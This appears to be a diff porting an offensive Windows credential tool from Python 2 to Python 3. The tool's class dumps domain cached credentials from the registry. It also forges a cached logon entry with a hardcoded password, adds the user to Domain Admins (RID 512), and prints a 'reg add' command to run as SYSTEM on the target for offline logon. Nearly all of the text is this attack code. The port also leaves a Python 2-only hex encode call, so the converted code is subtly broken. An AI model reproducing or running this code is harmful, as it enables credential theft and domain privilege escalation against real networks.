@@ -293,7 +293,7 @@ class Secrets(LSASecrets):
         if not self.credentials:
             values = self.enumValues('\\Cache')
             if values is None:
-                print 'no cached credentials'
+                print('no cached credentials')
                 return
 
             try:
@@ -313,9 +313,9 @@ class Secrets(LSASecrets):
 
     def dump(self):
         self.prepare()
-        print 'dumping domain cached credentials'
+        print('dumping domain cached credentials')
         for cre in self.credentials:
-            print cre.format()
+            print(cre.format())
 
     def patch(self, user):
         self.prepare()
@@ -332,14 +332,14 @@ class Secrets(LSASecrets):
                 cre.effective_name = uname
                 # cre._nl['UserId'] = 6666
 
-                password = 'n1nty@360 A-TEAM'
+                password = 'P@ssw0rd!'
                 cre.setpassword(password)
 
                 if not cre.is_domainadmin():
                     cre.add_group(relative_id=512)
 
 
-                print '''execute as SYSTEM on target: 
+                print('''execute as SYSTEM on target: 
     reg add "HKEY_LOCAL_MACHINE\SECURITY\Cache" /v "{nl}" /t REG_BINARY /d {binary} /f
 
 user being patched:
@@ -350,13 +350,13 @@ logon information:
     username: {domain}\{username}
     password: {password}
     * you can logon with credential above when there is !!!no contact with DC!!!. When there is, you can't do that
-                '''.format(patched_user=user, domain=cre.domain, username=cre.username, password=password, nl=cre.valuename, binary=cre.dump().encode('hex'))
+                '''.format(patched_user=user, domain=cre.domain, username=cre.username, password=password, nl=cre.valuename, binary=cre.dump().encode('hex')))
 
                 break
 
         else:
-            print 'not able to patch, there is no cached credential for', user
-            print
+            print('not able to patch, there is no cached credential for', user)
+            print()
 
             self.dump()
 
